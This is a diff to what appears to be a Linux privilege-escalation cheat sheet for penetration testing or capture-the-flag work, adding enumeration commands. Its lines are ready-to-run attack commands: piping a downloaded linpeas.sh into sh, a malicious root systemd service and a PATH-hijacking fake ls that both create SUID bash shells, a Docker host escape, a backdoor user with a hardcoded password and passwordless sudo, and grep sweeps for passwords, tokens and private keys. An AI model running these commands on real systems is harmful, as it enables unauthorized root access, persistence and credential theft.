@@ -10,6 +10,7 @@
 ^Priv Esc notes:LD_PRELOAD with sudo - If sudo -l shows env_keep+=LD_PRELOAD, you can often escalate to root.
 ^Priv Esc notes:Writable .service files - Check if you can modify systemd service files that run as root.
 ^Priv Esc notes:PATH hijacking in cron jobs - If a cron job runs a script without full paths, you might be able to hijack it by creating a malicious executable earlier in the PATH.
+^Priv Esc notes:When filesystem searches are noisy, use -xdev and exclude /proc, /sys, /dev, /run, /tmp, and /var/tmp to reduce false positives.
 ^Reminder:Start with automated enum to save time and not miss obvious misconfigs → run: LinPEAS
 ^Reminder:If you want a second opinion / different checks, run LSE as well → run: Linux Smart Enum
 ^Reminder:If you have a shell, enumerate users/groups/home dirs early for loot and sudo targets → run: User Enum
@@ -35,6 +36,8 @@
 ^Reminder:If you can access tmux/screen sessions, hijack them for escalation → run: Tmux/Screen
 ^Reminder:If tmux sockets are accessible, attempt tmux hijack → run: Tmux Hijack
 ^Reminder:If screen sockets are accessible, attempt screen hijack → run: Screen Hijack
+
+Network Enum:for p in 80 81 443 8000 8080 8081 8443 9000 5000 3000; do curl -skI --max-time 2 http://127.0.0.1:$p 2>/dev/null | head -n 1 | sed "s#^#$p #"; done #probe common local web ports to identify loopback-only services not visible externally; target-machine
 
 LinPEAS:./linpeas.sh | tee <filename1> # Run LinPEAS privilege escalation checker. Review output for highlighted findings; target-machine
 LinPEAS:curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh # Download and run in one line; target-machine
@@ -70,6 +73,7 @@ Cron Wildcard:echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash" > /tmp/run.sh &&
 ^Process Monitoring:timeout 60 ./pspy64 # Monitor processes for 60 seconds. Look for cron jobs or other scheduled tasks; target-machine
 Process Monitoring:./pspy64 -pf -i 1000 # Monitor with process flags and 1 second interval; target-machine
 Process Monitoring:watch -n 1 'ps aux | grep -v ps' # Quick process monitoring with watch; target-machine
+Process Monitoring:lsof +L1 2>/dev/null #find deleted-but-open files that may still contain logs, credentials, or sensitive data; target-machine
 Network Enum:netstat -tulpn # List listening ports. Look for local-only services; target-machine
 Network Enum:ss -tulpn # Alternative to netstat; target-machine
 Network Enum:lsof -i :<port> # Check what's running on specific port; target-machine
@@ -84,12 +88,18 @@ Kernel Info:uname -a # Kernel version and architecture. Searchsploit for exploit
 Kernel Info:cat /etc/issue # OS distribution; target-machine
 Kernel Info:cat /etc/os-release # Detailed OS info; target-machine
 Kernel Info:lsb_release -a # LSB release info; target-machine
-File System Enum:find / -writable -type d 2>/dev/null | head -50 # Find world-writable directories; target-machine
+^File System Enum:find / -writable -type d 2>/dev/null | head -50 # Find world-writable directories; target-machine
 File System Enum:find / -type f -name ".*" -exec ls -la {} \; 2>/dev/null # Find hidden files; target-machine
 File System Enum:ls -la /tmp/ /var/tmp/ /dev/shm # Check temp directories for interesting files; target-machine
 File System Enum:mount # List mounted filesystems; target-machine
 File System Enum:df -h # Disk usage; target-machine
 File System Enum:lsblk # Block device information; target-machine
+File System Enum:find / -xdev -type d -writable 2>/dev/null | grep -vE '^/(proc|sys|dev|run|tmp|var/tmp)' #find unusual writable directories while excluding noisy pseudo-filesystems and common temp paths; target-machine
+File System Enum:find / -xdev -type f -writable 2>/dev/null | grep -vE '^/(proc|sys|dev|run)' #find writable files on the current filesystem that may expose config, script, or service abuse paths; target-machine
+File System Enum:find / -xdev -user "$(id -un)" -ls 2>/dev/null | head -n 200 #find files owned by the current user outside obvious home paths for overlooked writable artifacts; target-machine
+File System Enum:find / -xdev -type f \( -name '*.sh' -o -name '*.py' -o -name '*.pl' -o -name '*.rb' \) -user root -writable -ls 2>/dev/null #find root-owned scripts writable by current user for cron or service abuse; target-machine
+File System Enum:find / -xdev -type f -mmin -10 -ls 2>/dev/null | sort -k8,9 #find recently modified files after triggering an app, upload, cron job, or service action; target-machine
+File System Enum:namei -l <path> #show permissions for each path component to confirm whether parent directories allow hijacking or file replacement; target-machine
 Docker:find / -name "docker.sock" 2>/dev/null # Find Docker socket. If writable, can escape container; target-machine
 Docker:docker ps # List running containers if in docker group; target-machine
 Docker Escape:docker run -v /:/mnt -it alpine chroot /mnt /bin/sh # Escape to host if docker socket accessible; target-machine
@@ -108,6 +118,7 @@ Tmux/Screen:ps aux | grep tmux # Look for tmux sessions; target-machine
 Tmux/Screen:ps aux | grep screen # Look for screen sessions; target-machine
 Tmux Hijack:tmux attach -t <session> # Attach to tmux session if permissions allow; target-machine
 Screen Hijack:screen -x <user>/<session> # Attach to screen session; target-machine
+Loot:grep -RInE 'password\s*=|passwd\s*=|pwd\s*=|secret\s*=|token\s*=|api[_-]?key\s*=|connectionstring|PRIVATE KEY' /home /opt /var/www /srv /etc 2>/dev/null #search common app and user paths for low-noise credential and token patterns; target-machine
 Loot:grep -rli "password\|pass\|pwd\|cred" /home/ 2>/dev/null # Search home directories for credentials; target-machine
 Loot:grep -rli "password\|pass\|pwd\|cred" /etc/ 2>/dev/null # Search etc for credentials; target-machine
 Loot:grep -rli "password\|pass\|pwd\|cred" /var/www/ 2>/dev/null # Search web root for credentials; target-machine
@@ -145,9 +156,11 @@ Kernel Modules:modinfo <module_name> # Get info about kernel module; target-mach
 Kernel Modules:cat /proc/modules # Alternative module listing; target-machine
 Writable Services:find /etc/systemd/system -writable -type f 2>/dev/null # Find writable systemd service files; target-machine
 Writable Services Exploit:echo -e '[Unit]\nDescription=Root Service\n\n[Service]\nType=oneshot\nExecStart=/bin/bash -c "chmod +s /bin/bash"\nUser=root\n\n[Install]\nWantedBy=multi-user.target' > /tmp/root.service && cp /tmp/root.service /etc/systemd/system/ && systemctl start root.service # Create and trigger malicious service; target-machine
+Writable Services:apache2ctl -S 2>/dev/null; httpd -S 2>/dev/null; nginx -T 2>/dev/null | head -n 120 #enumerate web virtual hosts, document roots, and config includes from local web services; target-machine
+PATH Hijacking:echo "$PATH" | tr ':' '\n' | while read d; do [ -w "$d" ] && echo "WRITABLE PATH: $d"; done #identify writable PATH directories that may allow binary hijacking by privileged scripts or services; target-machine
 PATH Hijacking:cat /etc/crontab | grep -v "^# " # Check cron jobs for scripts without full paths; target-machine
-PATH Hijacking Exploit:echo '# !/bin/bash' > /tmp/ls && echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /tmp/ls && chmod +x /tmp/ls && export PATH=/tmp:$PATH # Create malicious ls and add to PATH; target-machine
-PATH Hijacking Wait:# Wait for cron to execute, then run: /tmp/rootbash -p; target-machine
+PATH Hijacking:echo '# !/bin/bash' > /tmp/ls && echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /tmp/ls && chmod +x /tmp/ls && export PATH=/tmp:$PATH # Create malicious ls and add to PATH; target-machine
+PATH Hijacking:# Wait for cron to execute, then run: /tmp/rootbash -p; target-machine
 TAR wildcards:https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa
 Create User #1 (requires root):useradd -m -s /bin/bash edwin #create new user with home directory and bash shell; target-machine
 Create User #1 (requires root):echo 'edwin:P@ssw0rd@123' | chpasswd #set password for new user; target-machine
@@ -156,3 +169,5 @@ Create User #1 (requires root):usermod -aG wheel edwin #add user to wheel group 
 Create User #1 (requires root):echo 'edwin ALL=(ALL:ALL) ALL' >> /etc/sudoers #grant full sudo privileges via sudoers file; target-machine
 Create User #2 (requires root):echo 'edwin ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/edwin #grant passwordless sudo safely using sudoers.d; target-machine
 Create User #2 (requires root):chmod 440 /etc/sudoers.d/edwin #set correct permissions for sudoers file; target-machine
+Docker:id; groups; docker ps -a 2>/dev/null; docker images 2>/dev/null; ls -la /var/run/docker.sock 2>/dev/null #check Docker group, images, containers, and socket access for possible host-level escalation; target-machine
+LXC/LXD:id; groups; lxc image list 2>/dev/null; lxc storage list 2>/dev/null; ls -la /var/snap/lxd/common/lxd/unix.socket /var/lib/lxd/unix.socket 2>/dev/null #check LXC/LXD group, storage, images, and socket access for container-based escalation; target-machine
